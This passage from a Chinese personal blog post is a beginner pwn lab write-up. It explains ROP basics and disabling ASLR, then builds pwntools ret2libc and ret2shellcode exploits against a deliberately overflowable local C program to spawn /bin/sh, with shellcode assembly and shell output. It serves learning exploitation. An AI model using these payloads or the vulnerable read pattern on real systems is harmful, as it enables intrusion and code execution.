</span></code></pre><p>结果：<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-1 » python exploit64.py 
</span><span>[+] Starting local process './question64': pid 10128
</span><span>b'4\x12\x00\x00\x00\x00\x00\x00'
</span><span>[*] Process './question64' stopped with exit code 0 (pid 10128)
</span><span>buffer: 0x7ffc03d29950, secret: 0x7ffc03d299bc
</span><span>cool!
</span></code></pre><h2 id=rop-ji-chu>ROP 基础</h2><p>有趣的部分真正开始。ROP 全称是 <em>Return Oriented Programming</em>，一种通过返回指令串联代码片段，以执行复杂逻辑的技术思想。参考文章：<a href=https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#rop>ctf wiki - 基本ROP</a>。<h3 id=yuan-li-1>原理</h3><p>从简单的开始说起。<code>call</code>指令的本质是压栈IP寄存器接一个无条件跳转指令。而<code>ret</code>指令本质是从栈上弹出一个地址，然后无条件跳转。<p>那么能用<code>ret</code>替代<code>call</code>指令吗？把<code>ret</code>当成<code>jmp</code>来用，当然没什么不能的（考虑 x86/cdecl 调用约定）。<p><img alt=image-20220816110634684 src=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/image-20220816110634684.webp><p><code>ret</code> 指令执行后，栈上布局就会变成：<p><img alt=image-20220816110756861 src=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/image-20220816110756861.png.webp><p>和正常函数调用如出一辙。<h3 id=aslr>ASLR</h3><p>想要实现自由控制跳转地址和参数的目的，还有一个拦路虎叫 ASLR 不作更多解释。通过 <code>sysctl</code> 或编辑 <code>/proc/sys/kernel/randomize_va_space</code> 控制。<pre class=language-makefile data-lang=makefile style=color:#fdf4c1aa;background-color:#282828><code class=language-makefile data-lang=makefile><span style=color:#8ec07c>.PHONY</span><span style=color:#fe8019>: </span><span style=color:#b8bb26>disable-aslr
</span><span style=color:#8ec07c>disable-aslr</span><span style=color:#fe8019>:
</span><span>	</span><span style=color:#fabd2f>echo</span><span style=color:#fdf4c1> 0 </span><span style=color:#fe8019>| </span><span style=color:#fdf4c1>sudo tee /proc/sys/kernel/randomize_va_space
</span><span>
</span><span style=color:#8ec07c>.PHONY</span><span style=color:#fe8019>: </span><span style=color:#b8bb26>enable-aslr
</span><span style=color:#8ec07c>enable-aslr</span><span style=color:#fe8019>:
</span><span>	</span><span style=color:#fabd2f>echo</span><span style=color:#fdf4c1> 1 </span><span style=color:#fe8019>| </span><span style=color:#fdf4c1>sudo tee /proc/sys/kernel/randomize_va_space
</span></code></pre><p>之后可以多次运行 <code>question32</code> ，观察输出来确认栈地址是否变化。<h3 id=ret2libc>ret2libc</h3><pre class=language-c data-lang=c style=color:#fdf4c1aa;background-color:#282828><code class=language-c data-lang=c><span style=color:#928374;font-style:italic>// gcc question.c -m32 -fno-stack-protector -no-pie -g -O0 -o question32
</span><span style=color:#fa5c4b>#include </span><span style=color:#b8bb26>&lt;stdio.h>
</span><span style=color:#fa5c4b>#include </span><span style=color:#b8bb26>&lt;unistd.h>
</span><span>
</span><span style=color:#fa5c4b>char</span><span> name[</span><span style=color:#d3869b>100</span><span>] </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>""</span><span>;
</span><span>
</span><span style=color:#fa5c4b>int </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>) {
</span><span>  </span><span style=color:#fa5c4b>char</span><span> buffer[</span><span style=color:#d3869b>100</span><span>] </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>""</span><span>;
</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"name: </span><span style=color:#fdf4c1>%p</span><span style=color:#b8bb26> buffer: </span><span style=color:#fdf4c1>%p</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>, name, buffer)</span><span>;
</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"what's your name?\n"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fdf4c1>read(STDIN_FILENO, name, </span><span style=color:#fe8019>sizeof</span><span style=color:#fdf4c1>(name) </span><span style=color:#fe8019>- </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Welcome, </span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>. Show your hack skill.\n"</span><span style=color:#fdf4c1>, name)</span><span>;
</span><span>  </span><span style=color:#fdf4c1>read(STDIN_FILENO, buffer, </span><span style=color:#d3869b>0x100</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
</span><span>}
</span></code></pre><p>简单写一个脚本。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>pwn
</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span>gdb, process
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>p32s</span><span>(</span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>i</span><span>):
</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>"&lt;"</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>"I"</span><span style=color:#fe8019>*</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(i), </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>i)
</span><span>
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>gdb.debug(</span><span style=color:#b8bb26>'./question32'</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>'''
</span><span style=color:#b8bb26>b question.c:13
</span><span style=color:#b8bb26>continue
</span><span style=color:#b8bb26>'''</span><span style=color:#fdf4c1>)
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p>观察程序的 epilogue 部分，<code>main()</code> 在 prologue 部分保存了 <code>%ecx</code>、<code>%edi</code>、<code>%ebx</code> 寄存器的值，在清栈阶段会恢复这些寄存器。<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>   leal	</span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>12</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>ebp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp
</span><span style=color:#8ec07c>   popl	%</span><span style=color:#fdf4c1>ecx
</span><span style=color:#8ec07c>   popl	%</span><span style=color:#fdf4c1>ebx
</span><span style=color:#8ec07c>   popl	%</span><span style=color:#fdf4c1>edi
</span><span style=color:#8ec07c>   popl	%</span><span style=color:#fdf4c1>ebp
</span><span style=color:#8ec07c>   leal	</span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>ecx</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>esp
</span><span style=color:#8ec07c>   </span><span style=color:#fa5c4b>ret
</span></code></pre><p>需要注意的是 <code>%ecx</code> 寄存器的值会被用作 <code>%esp</code> ，而我们覆写返回地址必然导致 <code>%ecx</code> 寄存器的值被覆写，所以需要提前算好 <code>leal -4(%ecx), %esp</code> 指令执行后 <code>%esp</code> 指向的位置，让 <code>%esp</code> 刚好指向我们期望的 <code>system</code> 函数地址。<p>脚本启动 gdb 后先计算下 <code>&buffer</code> 到 <code>movl -12(%ebp), %esp</code> 这条指令后的 <code>%esp</code> 的距离，也就是从<code>buffer</code>一路写到栈上保存的 <code>%ecx</code> 前所需填充的长度。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>gdb-peda$ p &buffer
</span><span>$1 = (char (*)[100]) 0xffffd0dc
</span><span>gdb-peda$ distance 0xffffd0dc
</span><span>From 0xffffd14c (SP) to 0xffffd0dc: -112 bytes, -28 dwords
</span><span>gdb-peda$
</span></code></pre><p>得到长度后简单计算下 <code>&buffer(0xffffd0dc) + padding_size(112) + register(4) * 4</code> 等于 <code>0xffffd1bc</code>，这个地址就是我们溢出后覆写的返回地址所在位置，这个地址加上 4 就是 <code>%ecx</code> 的取值了。<p>最后获取 <code>system</code> 函数的地址和 <code>name</code> 的地址，作为 <code>system</code> 函数的返回地址我们再获取一下 <code>exit</code> 函数的地址。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>gdb-peda$ p &system
</span><span>$1 = (&lt;text variable, no debug info> *) 0xf7dcbcb0 &lt;system>
</span><span>gdb-peda$ p &name
</span><span>$2 = (char (*)[100]) 0x804c060 &lt;name>
</span><span>gdb-peda$ p &exit
</span><span>$3 = (&lt;text variable, no debug info> *) 0xf7dbe1c0 &lt;exit>
</span><span>gdb-peda$
</span></code></pre><p>综合这些元素组装一个 payload 。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span>gdb
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>gdb.debug(</span><span style=color:#b8bb26>'./question32'</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>'''
</span><span style=color:#b8bb26>b question.c:13
</span><span style=color:#b8bb26>continue
</span><span style=color:#b8bb26>'''</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=color:#fdf4c1>p.send(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'/bin/sh'</span><span style=color:#fdf4c1>)
</span><span>
</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x42' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>112
</span><span style=color:#928374;font-style:italic># %ecx, %ebx, %edi, %ebp, &system, &exit, &name
</span><span>stack_elem </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#d3869b>0xffffd1c0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0xf7dcbcb0</span><span>, </span><span style=color:#d3869b>0xf7dbe1c0</span><span>, </span><span style=color:#d3869b>0x804c060</span><span>]
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'&lt;IIIIIII'</span><span style=color:#fdf4c1>, </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>stack_elem)
</span><span style=color:#fdf4c1>p.send(payload)
</span><span>
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p>启动调试，注意到执行到 <code>ret</code> 时，<code>%esp</code> 已经是 <code>system</code> 的地址，并预先填充了 <code>exit</code> 函数地址作为 <code>system</code> 函数的返回地址，<code>"/bin/sh"</code> 字符串的指针作为 <code>system</code> 函数的参数。<p><img alt=image-20220817161537813 src=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/image-20220817161537813.webp><p>继续执行。<p><img alt=image-20220817161746120 src=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/image-20220817161746120.webp><p>成功取得shell。现在我们把调试器去除，使用 <code>pwn.process</code> 来启动程序。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span>process
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process(</span><span style=color:#b8bb26>'./question32'</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=color:#fdf4c1>p.send(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'/bin/sh'</span><span style=color:#fdf4c1>)
</span><span>
</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x42' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>112
</span><span style=color:#928374;font-style:italic># %ecx, %ebx, %edi, %ebp, &system, &perror, &name
</span><span>stack_elem </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#d3869b>0xffffd1c0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0xf7dcbcb0</span><span>, </span><span style=color:#d3869b>0xf7dbe1c0</span><span>, </span><span style=color:#d3869b>0x804c060</span><span>]
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'&lt;IIIIIII'</span><span style=color:#fdf4c1>, </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>stack_elem)
</span><span style=color:#fdf4c1>p.send(payload)
</span><span>
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p>结果：<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-2 » python exp32.py
</span><span>[+] Starting local process './question32': pid 146484
</span><span>[*] Switching to interactive mode
</span><span>name: 0x804c060 buffer: 0xffffd13c
</span><span>what's your name?
</span><span>Welcome, /bin/sh. Show your hack skill.
</span><span>$ echo $0
</span><span>/bin/sh
</span><span>$
</span></code></pre><p>成功。<h3 id=ret2shellcode>ret2shellcode</h3><p>这是另一个例子，不同之处在于栈可执行保护没有开启（编译参数 <code>-z execstack</code>）。其他和上例相同。<p>pwntools 提供了一些 shellcode 片段，其中就有用系统调用 <code>execve</code> 启动 <code>/bin/sh</code> 的代码。在 <code>ret2libc</code> 的 <code>exploit</code> 基础上，我们只用把返回地址修改成 <code>buffer</code> 的地址，把填充 <code>buffer</code> 的 <code>\x41</code> 换成 shellcode 即可。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span>gdb, shellcraft, asm
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>gdb.debug(</span><span style=color:#b8bb26>'./question32'</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>'''
</span><span style=color:#b8bb26>b question.c:13
</span><span style=color:#b8bb26>continue
</span><span style=color:#b8bb26>'''</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=color:#fdf4c1>p.send(</span><span style=color:#b8bb26>'hacker'</span><span style=color:#fdf4c1>)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv().decode())
</span><span>
</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>asm(shellcraft.i386.linux.sh())
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x00' </span><span style=color:#fe8019>* </span><span>(</span><span style=color:#d3869b>112</span><span style=color:#fe8019>-</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(payload)</span><span>)
</span><span style=color:#928374;font-style:italic># %ecx, %ebx, %edi, %ebp, &buffer
</span><span>stack_elem </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#d3869b>0xffffd1c0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#d3869b>0xffffd13c</span><span>]
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'&lt;IIIII'</span><span style=color:#fdf4c1>, </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>stack_elem)
</span><span style=color:#fdf4c1>p.send(payload)
</span><span style=color:#fdf4c1>p.interactive()
</span></code></pre><p>在调试器中观察，确认<code>ret</code>跳转到了<code>&buffer</code>，将脚本改为 <code>pwn.process</code> 即可。<p><img alt=image-20220817170010162 src=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/image-20220817170010162.png.webp><p>还可以看下 <code>shellcraft.i386.linux.sh</code> 提供的代码片段长什么样。<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>    /</span><span style=color:#fdf4c1>* </span><span style=color:#8ec07c>execve(path=</span><span style=color:#b8bb26>'/bin///sh'</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>argv=</span><span style=color:#fdf4c1>[</span><span style=color:#b8bb26>'sh'</span><span style=color:#fdf4c1>], </span><span style=color:#8ec07c>envp=</span><span style=color:#d3869b>0</span><span style=color:#8ec07c>) </span><span style=color:#fdf4c1>*</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    /</span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>push </span><span style=color:#8ec07c>b</span><span style=color:#b8bb26>'/bin///sh\x00' </span><span style=color:#fdf4c1>*</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#d3869b>0x68
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#d3869b>0x732f2f2f
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#d3869b>0x6e69622f
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>mov </span><span style=color:#fdf4c1>ebx, esp
</span><span style=color:#8ec07c>    /</span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>push </span><span style=color:#8ec07c>argument array </span><span style=color:#fdf4c1>[</span><span style=color:#b8bb26>'sh\x00'</span><span style=color:#fdf4c1>] *</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    /</span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>push </span><span style=color:#b8bb26>'sh\x00\x00' </span><span style=color:#fdf4c1>*</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#d3869b>0x1010101
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>xor </span><span style=color:#fabd2f>dword ptr </span><span style=color:#fdf4c1>[esp], </span><span style=color:#d3869b>0x1016972
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>xor </span><span style=color:#fdf4c1>ecx, ecx
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#fdf4c1>ecx </span><span style=color:#8ec07c>/</span><span style=color:#fdf4c1>* </span><span style=color:#8ec07c>null terminate </span><span style=color:#fdf4c1>*</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#d3869b>4
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>pop </span><span style=color:#fdf4c1>ecx
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>add </span><span style=color:#fdf4c1>ecx, esp
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#fdf4c1>ecx </span><span style=color:#8ec07c>/</span><span style=color:#fdf4c1>* </span><span style=color:#b8bb26>'sh\x00' </span><span style=color:#fdf4c1>*</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>mov </span><span style=color:#fdf4c1>ecx, esp
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>xor </span><span style=color:#fdf4c1>edx, edx
</span><span style=color:#8ec07c>    /</span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>call </span><span style=color:#8ec07c>execve() </span><span style=color:#fdf4c1>*</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>push </span><span style=color:#8ec07c>SYS_execve /</span><span style=color:#fdf4c1>* </span><span style=color:#d3869b>0xb </span><span style=color:#fdf4c1>*</span><span style=color:#8ec07c>/
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>pop </span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c>    </span><span style=color:#fa5c4b>int </span><span style=color:#d3869b>0x80
</span></code></pre><p>乍一看有点奇怪，但注意观察汇编后的机器码就会发现这段汇编编译后不包含 <code>\x00</code>，在 <code>strcpy</code> 之类的场景下能避免被截断，泛用性更好。<h2 id=zong-jie>总结</h2><p>存在几个问题。<ol><li>很多保护机制绕过方法没有学。ASLR、PIE、NX、CANARY 等。<li>花了很长时间去无谓地算偏移，明明给了 <code>andl -16, %esp</code> 却不肯看一眼对齐前后 <code>%esp</code> 怎么变。<li>gdb 不熟练，<code>gdb-peda</code> 真的很好用，绝了。<li>还没试过构造 ROP Gadget 链</ol><p>各方面都有很大提高空间吧。想找个群什么的有问题不用自己强钻牛角尖。</article><p class=tags-data><a href=/tags/pwn>/pwn/</a> <a href=/tags/security>/security/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>